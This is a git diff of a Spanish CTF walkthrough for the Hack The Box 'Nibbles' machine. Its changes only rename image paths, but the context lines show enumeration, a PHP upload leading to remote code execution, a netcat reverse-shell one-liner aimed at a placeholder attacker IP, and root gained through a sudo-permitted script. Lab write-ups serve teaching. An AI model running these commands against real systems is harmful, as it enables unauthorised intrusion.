@@ -90,7 +90,7 @@ No hay otros puertos abiertos y no encontramos más directorios. Podemos confirm
 gobuster dir -u http://10.129.12.162/ --wordlist /usr/share/dirb/wordlists/common.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al revisar nuevamente todos los directorios expuestos, encontramos un archivo **config.xml**.
 
@@ -98,7 +98,7 @@ Al revisar nuevamente todos los directorios expuestos, encontramos un archivo **
 curl -s http://10.129.12.162/nibbleblog/content/private/config.xml | xmllint --format -
 ```
 
-<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al revisar el archivo, esperamos encontrar contraseñas, pero no obtenemos resultados. Sin embargo, vemos dos menciones de "**nibbles**" en el título del sitio y en la dirección de correo de notificación. Este también es el nombre de la máquina.&#x20;
 
@@ -108,7 +108,7 @@ Al realizar cracking de contraseñas offline con una herramienta como **Hashcat*
 cewl http://10.129.12.162/nibbleblog -w wordlist.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🚀 **EXPLOTACIÓN**
 
@@ -124,7 +124,7 @@ Ahora tenemos que averiguar dónde se subió el archivo si la carga fue exitosa.
 curl http://10.129.12.162/nibbleblog/content/private/plugins/my_image/image.php
 ```
 
-<figure><img src="../../.gitbook/assets/image (21) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Parece que hemos obtenido ejecución remota de código en el servidor web, y el servidor Apache se está ejecutando en el contexto del usuario `nibbler`. Vamos a modificar nuestro archivo PHP para obtener una shell inversa y comenzar a explorar el servidor.
 
@@ -144,15 +144,15 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING 
 nc -lvnp 443
 ```
 
-<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Pinchamos en el fichero image.php.
 
-<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tenemos Python3, lo cual nos permite obtener una shell más amigable escribiendo `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Al navegar a `/home/nibbler`, encontramos la bandera `user.txt` así como un archivo zip llamado `personal.zip`.
 
-<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🔐 **PRIVILEGIOS**
 
@@ -170,7 +170,7 @@ sudo -l
 
 para ver si hay algo para explotar.
 
-<figure><img src="../../.gitbook/assets/image (25) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (25) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Si accedemos a esa ruta, veremos que no existe. Por lo tanto, necesitaremos crear el directorio y el archivo:
 
@@ -185,4 +185,4 @@ sudo ./monitor.sh
 
 Con estos pasos, obtendremos acceso root. Luego, al ir a `/root/root.txt`, podremos ver la bandera ROOT.
 
-<figure><img src="../../.gitbook/assets/image (26) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (26) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
